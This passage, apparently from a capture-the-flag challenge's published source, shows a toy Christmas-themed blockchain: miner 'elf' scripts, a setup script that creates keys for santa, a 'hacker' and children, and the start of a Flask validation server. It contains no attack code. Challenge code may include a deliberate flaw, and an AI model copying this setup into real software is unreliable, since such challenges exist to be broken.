            <span class="sh">"</span><span class="s">dst</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">santa</span><span class="sh">"</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">letter</span><span class="sh">"</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">letter</span><span class="sh">"</span><span class="p">:</span> <span class="n">letter</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">()),</span>
        <span class="p">}</span>

        <span class="n">msg</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">letter</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">))</span>
        <span class="n">digest</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">digest</span><span class="p">()</span>
        <span class="n">letter</span><span class="p">[</span><span class="sh">"</span><span class="s">sig</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="n">keys</span><span class="p">[</span><span class="n">child</span><span class="p">].</span><span class="nf">sign</span><span class="p">(</span><span class="n">digest</span><span class="p">).</span><span class="nf">hex</span><span class="p">()</span>

        <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">NORTH_POOLE</span><span class="si">}</span><span class="s">/tx</span><span class="sh">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">letter</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">resp</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[</span><span class="si">{</span><span class="n">child</span><span class="si">}</span><span class="s">] asked for </span><span class="sh">'</span><span class="si">{</span><span class="n">gift</span><span class="si">}</span><span class="sh">'</span><span class="s"> (</span><span class="si">{</span><span class="n">letter</span><span class="p">[</span><span class="sh">'</span><span class="s">nonce</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="s">)</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[</span><span class="si">{</span><span class="n">child</span><span class="si">}</span><span class="s">] request rejected: </span><span class="si">{</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[</span><span class="si">{</span><span class="n">child</span><span class="si">}</span><span class="s">] error:</span><span class="sh">"</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>

    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">120</span><span class="p">))</span>
</pre></table></code></div></div></details> <details> <summary>Click to view <code>elf.py</code></summary><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/local/bin/python -u
</span><span class="kn">import</span> <span class="n">hashlib</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">random</span>
<span class="kn">import</span> <span class="n">time</span>
<span class="kn">from</span> <span class="n">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>

<span class="kn">import</span> <span class="n">requests</span>

<span class="n">NORTH_POOLE</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">[</span><span class="sh">"</span><span class="s">NORTH_POOLE</span><span class="sh">"</span><span class="p">]</span>
<span class="n">ELF_NAME</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">[</span><span class="sh">"</span><span class="s">ELF_NAME</span><span class="sh">"</span><span class="p">]</span>

<span class="n">DIFFICULTY</span> <span class="o">=</span> <span class="mi">16</span>
<span class="n">DIFFICULTY_PREFIX</span> <span class="o">=</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">DIFFICULTY</span> <span class="o">//</span> <span class="mi">4</span><span class="p">)</span>
<span class="n">CHILDREN</span> <span class="o">=</span> <span class="p">[</span><span class="n">path</span><span class="p">.</span><span class="n">name</span> <span class="k">for</span> <span class="n">path</span> <span class="ow">in</span> <span class="nc">Path</span><span class="p">(</span><span class="sh">"</span><span class="s">/challenge/keys</span><span class="sh">"</span><span class="p">).</span><span class="nf">iterdir</span><span class="p">()]</span>
<span class="n">NICE</span> <span class="o">=</span> <span class="nf">list</span><span class="p">()</span>  <span class="c1"># The nice list doesn't care about your fancy set O(1) operations
</span>

<span class="k">def</span> <span class="nf">hash_block</span><span class="p">(</span><span class="n">block</span><span class="p">:</span> <span class="nb">dict</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
    <span class="n">block_str</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">block</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="n">block_str</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">hexdigest</span><span class="p">()</span>


<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Elf </span><span class="si">{</span><span class="n">ELF_NAME</span><span class="si">}</span><span class="s"> starting to mine for the North-Poole... difficulty=</span><span class="si">{</span><span class="n">DIFFICULTY</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[</span><span class="si">{</span><span class="n">ELF_NAME</span><span class="si">}</span><span class="s">] mining a new block...</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">tx_resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">NORTH_POOLE</span><span class="si">}</span><span class="s">/txpool</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">tx_resp</span><span class="p">.</span><span class="nf">raise_for_status</span><span class="p">()</span>
        <span class="n">tx_json</span> <span class="o">=</span> <span class="n">tx_resp</span><span class="p">.</span><span class="nf">json</span><span class="p">()</span>
        <span class="n">txs</span> <span class="o">=</span> <span class="n">tx_json</span><span class="p">[</span><span class="sh">"</span><span class="s">txs</span><span class="sh">"</span><span class="p">]</span>
        <span class="n">head_hash</span> <span class="o">=</span> <span class="n">tx_json</span><span class="p">[</span><span class="sh">"</span><span class="s">hash</span><span class="sh">"</span><span class="p">]</span>

        <span class="n">head_resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">NORTH_POOLE</span><span class="si">}</span><span class="s">/block</span><span class="sh">"</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">hash</span><span class="sh">"</span><span class="p">:</span> <span class="n">head_hash</span><span class="p">})</span>
        <span class="n">head_resp</span><span class="p">.</span><span class="nf">raise_for_status</span><span class="p">()</span>
        <span class="n">head_json</span> <span class="o">=</span> <span class="n">head_resp</span><span class="p">.</span><span class="nf">json</span><span class="p">()</span>
        <span class="n">head_block</span> <span class="o">=</span> <span class="n">head_json</span><span class="p">[</span><span class="sh">"</span><span class="s">block</span><span class="sh">"</span><span class="p">]</span>

        <span class="n">children</span> <span class="o">=</span> <span class="p">[</span><span class="n">child</span> <span class="k">for</span> <span class="n">child</span> <span class="ow">in</span> <span class="n">CHILDREN</span> <span class="k">if</span> <span class="n">child</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">NICE</span><span class="p">]</span>
        <span class="k">if</span> <span class="n">random</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span> <span class="o">&gt;=</span> <span class="mf">0.5</span> <span class="ow">and</span> <span class="n">children</span><span class="p">:</span>
            <span class="n">nice</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">children</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">nice</span> <span class="o">=</span> <span class="bp">None</span>

        <span class="n">block</span> <span class="o">=</span> <span class="p">{</span>
            <span class="sh">"</span><span class="s">index</span><span class="sh">"</span><span class="p">:</span> <span class="n">head_block</span><span class="p">[</span><span class="sh">"</span><span class="s">index</span><span class="sh">"</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">prev_hash</span><span class="sh">"</span><span class="p">:</span> <span class="nf">hash_block</span><span class="p">(</span><span class="n">head_block</span><span class="p">),</span>
            <span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">txs</span><span class="sh">"</span><span class="p">:</span> <span class="n">txs</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">nice</span><span class="sh">"</span><span class="p">:</span> <span class="n">nice</span><span class="p">,</span>
        <span class="p">}</span>

        <span class="n">nonce</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">block</span><span class="p">[</span><span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="n">nonce</span>
            <span class="n">block_hash</span> <span class="o">=</span> <span class="nf">hash_block</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">block_hash</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="n">DIFFICULTY_PREFIX</span><span class="p">):</span>
                <span class="k">break</span>
            <span class="n">nonce</span> <span class="o">+=</span> <span class="mi">1</span>

        <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">NORTH_POOLE</span><span class="si">}</span><span class="s">/block</span><span class="sh">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">block</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">resp</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[</span><span class="si">{</span><span class="n">ELF_NAME</span><span class="si">}</span><span class="s">] mined block </span><span class="si">{</span><span class="n">block</span><span class="p">[</span><span class="sh">'</span><span class="s">index</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="s"> (</span><span class="si">{</span><span class="n">block_hash</span><span class="si">}</span><span class="s">)</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">nice</span> <span class="ow">in</span> <span class="n">CHILDREN</span><span class="p">:</span>
                <span class="n">NICE</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">nice</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[</span><span class="si">{</span><span class="n">ELF_NAME</span><span class="si">}</span><span class="s">] block rejected: </span><span class="si">{</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[</span><span class="si">{</span><span class="n">ELF_NAME</span><span class="si">}</span><span class="s">] exception while mining: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">120</span><span class="p">))</span>
</pre></table></code></div></div></details> <details> <summary>Click to view <code>init-northpoole.sh</code></summary><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="c">#!/bin/sh</span>
<span class="nb">set</span> <span class="nt">-eu</span>

<span class="nb">cd</span> /challenge

<span class="nb">mkdir</span> <span class="nt">-p</span> /challenge/keys
<span class="nv">CHILDREN</span><span class="o">=</span><span class="s2">"willow hazel holly rowan laurel juniper aspen ash maple alder cedar birch elm cypress pine spruce"</span>
<span class="k">for </span>identity <span class="k">in </span>santa hacker <span class="nv">$CHILDREN</span><span class="p">;</span> <span class="k">do
  </span><span class="nb">mkdir</span> <span class="nt">-p</span> <span class="s2">"/challenge/keys/</span><span class="k">${</span><span class="nv">identity</span><span class="k">}</span><span class="s2">"</span>
  ssh-keygen <span class="nt">-t</span> ed25519 <span class="nt">-N</span> <span class="s2">""</span> <span class="nt">-f</span> <span class="s2">"/challenge/keys/</span><span class="k">${</span><span class="nv">identity</span><span class="k">}</span><span class="s2">/key"</span> <span class="o">&gt;</span>/dev/null
<span class="k">done
</span><span class="nb">chown</span> <span class="nt">-R</span> 1000:1000 /challenge/keys/hacker

<span class="nb">touch</span> /var/log/north_poole.log
<span class="nb">chmod </span>600 /var/log/north_poole.log

<span class="nb">touch</span> /var/log/santa.log
<span class="nb">chmod </span>600 /var/log/santa.log

<span class="nb">touch</span> /var/log/elf.log
<span class="nb">chmod </span>600 /var/log/elf.log

<span class="nb">touch</span> /var/log/children.log
<span class="nb">chmod </span>600 /var/log/children.log

./north_poole.py <span class="o">&gt;&gt;</span> /var/log/north_poole.log 2&gt;&amp;1 &amp;
<span class="nb">sleep </span>2

<span class="nb">export </span><span class="nv">NORTH_POOLE</span><span class="o">=</span>http://localhost

./santa.py <span class="o">&gt;&gt;</span> /var/log/santa.log 2&gt;&amp;1 &amp;

<span class="k">for </span>name <span class="k">in </span>jingle sparkle tinsel nog snowflake<span class="p">;</span> <span class="k">do
  </span><span class="nv">ELF_NAME</span><span class="o">=</span><span class="s2">"</span><span class="nv">$name</span><span class="s2">"</span> ./elf.py <span class="o">&gt;&gt;</span> /var/log/elf.log 2&gt;&amp;1 &amp;
<span class="k">done</span>

./children.py <span class="nv">$CHILDREN</span> <span class="o">&gt;&gt;</span> /var/log/children.log 2&gt;&amp;1 &amp;
</pre></table></code></div></div></details> <details> <summary>Click to view <code>north_poole.py</code></summary><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/local/bin/python -u
</span><span class="kn">import</span> <span class="n">hashlib</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">import</span> <span class="n">time</span>
<span class="kn">import</span> <span class="n">uuid</span>
<span class="kn">from</span> <span class="n">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>

<span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">request</span>
<span class="kn">from</span> <span class="n">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">serialization</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="n">DIFFICULTY</span> <span class="o">=</span> <span class="mi">16</span>
<span class="n">TX_EXPIRY_SECONDS</span> <span class="o">=</span> <span class="mi">60</span>

<span class="k">def</span> <span class="nf">hash_block</span><span class="p">(</span><span class="n">block</span><span class="p">:</span> <span class="nb">dict</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
    <span class="n">block_str</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">block</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="n">block_str</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">hexdigest</span><span class="p">()</span>


<span class="n">genesis</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">index</span><span class="sh">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">prev_hash</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">64</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">:</span> <span class="sh">""</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">txs</span><span class="sh">"</span><span class="p">:</span> <span class="p">[],</span>
    <span class="sh">"</span><span class="s">nice</span><span class="sh">"</span><span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
<span class="p">}</span>

<span class="n">BLOCKS</span> <span class="o">=</span> <span class="p">{</span><span class="nf">hash_block</span><span class="p">(</span><span class="n">genesis</span><span class="p">):</span> <span class="n">genesis</span><span class="p">}</span>
<span class="n">TXPOOL</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">IDENTITIES</span> <span class="o">=</span> <span class="p">{</span>
    <span class="n">child_dir</span><span class="p">.</span><span class="n">name</span><span class="p">:</span> <span class="n">serialization</span><span class="p">.</span><span class="nf">load_ssh_public_key</span><span class="p">((</span><span class="n">child_dir</span> <span class="o">/</span> <span class="sh">"</span><span class="s">key.pub</span><span class="sh">"</span><span class="p">).</span><span class="nf">read_bytes</span><span class="p">())</span>
    <span class="k">for</span> <span class="n">child_dir</span> <span class="ow">in</span> <span class="nc">Path</span><span class="p">(</span><span class="sh">"</span><span class="s">/challenge/keys</span><span class="sh">"</span><span class="p">).</span><span class="nf">iterdir</span><span class="p">()</span>
<span class="p">}</span>


<span class="k">def</span> <span class="nf">get_best_chain_block</span><span class="p">():</span>
    <span class="n">best_hash</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="n">best_index</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
    <span class="k">for</span> <span class="n">blk_hash</span><span class="p">,</span> <span class="n">blk</span> <span class="ow">in</span> <span class="n">BLOCKS</span><span class="p">.</span><span class="nf">items</span><span class="p">():</span>
        <span class="k">if</span> <span class="n">blk</span><span class="p">[</span><span class="sh">"</span><span class="s">index</span><span class="sh">"</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">best_index</span><span class="p">:</span>
            <span class="n">best_index</span> <span class="o">=</span> <span class="n">blk</span><span class="p">[</span><span class="sh">"</span><span class="s">index</span><span class="sh">"</span><span class="p">]</span>
            <span class="n">best_hash</span> <span class="o">=</span> <span class="n">blk_hash</span>
    <span class="k">return</span> <span class="n">best_hash</span>


<span class="k">def</span> <span class="nf">validate_tx</span><span class="p">(</span><span class="n">tx</span><span class="p">):</span>
    <span class="n">tx_type</span> <span class="o">=</span> <span class="n">tx</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">tx_type</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">{</span><span class="sh">"</span><span class="s">letter</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">gift</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">transfer</span><span class="sh">"</span><span class="p">}:</span>
        <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">invalid tx type</span><span class="sh">"</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">field</span> <span class="ow">in</span> <span class="p">(</span><span class="sh">"</span><span class="s">src</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">dst</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">,</span> <span class="n">tx_type</span><span class="p">,</span> <span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">sig</span><span class="sh">"</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">field</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">tx</span><span class="p">:</span>
            <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">missing field </span><span class="si">{</span><span class="n">field</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

    <span class="n">identity</span> <span class="o">=</span> <span class="n">IDENTITIES</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">src</span><span class="sh">"</span><span class="p">])</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">identity</span><span class="p">:</span>
        <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">unknown src</span><span class="sh">"</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">dst</span><span class="sh">"</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">IDENTITIES</span><span class="p">:</span>
        <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">unknown dst</span><span class="sh">"</span><span class="p">)</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">sig</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">tx</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">sig</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">))</span>
    <span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
        <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">invalid sig encoding</span><span class="sh">"</span><span class="p">)</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">src</span><span class="sh">"</span><span class="p">:</span> <span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">src</span><span class="sh">"</span><span class="p">],</span>
        <span class="sh">"</span><span class="s">dst</span><span class="sh">"</span><span class="p">:</span> <span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">dst</span><span class="sh">"</span><span class="p">],</span>
        <span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">:</span> <span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">],</span>
        <span class="n">tx_type</span><span class="p">:</span> <span class="n">tx</span><span class="p">[</span><span class="n">tx_type</span><span class="p">],</span>
        <span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">:</span> <span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">],</span>
    <span class="p">}</span>
    <span class="n">msg</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">))</span>
    <span class="n">digest</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">digest</span><span class="p">()</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">identity</span><span class="p">.</span><span class="nf">verify</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">digest</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
        <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">invalid signature</span><span class="sh">"</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">tx_type</span> <span class="o">==</span> <span class="sh">"</span><span class="s">transfer</span><span class="sh">"</span><span class="p">:</span>
        <span class="n">amount</span> <span class="o">=</span> <span class="n">tx</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">transfer</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">amount</span><span class="p">,</span> <span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="nb">float</span><span class="p">))</span> <span class="ow">or</span> <span class="n">amount</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">invalid transfer amount</span><span class="sh">"</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">get_nice_balances</span><span class="p">(</span><span class="n">block</span><span class="p">):</span>
    <span class="n">balances</span> <span class="o">=</span> <span class="p">{</span><span class="n">name</span><span class="p">:</span> <span class="mi">1</span> <span class="k">for</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">IDENTITIES</span><span class="p">}</span>

    <span class="n">chain</span> <span class="o">=</span> <span class="p">[</span><span class="n">block</span><span class="p">]</span>
    <span class="n">current_hash</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="sh">"</span><span class="s">prev_hash</span><span class="sh">"</span><span class="p">]</span>
    <span class="k">while</span> <span class="n">current_hash</span> <span class="ow">in</span> <span class="n">BLOCKS</span><span class="p">:</span>
        <span class="n">blk</span> <span class="o">=</span> <span class="n">BLOCKS</span><span class="p">[</span><span class="n">current_hash</span><span class="p">]</span>
        <span class="n">chain</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">blk</span><span class="p">)</span>
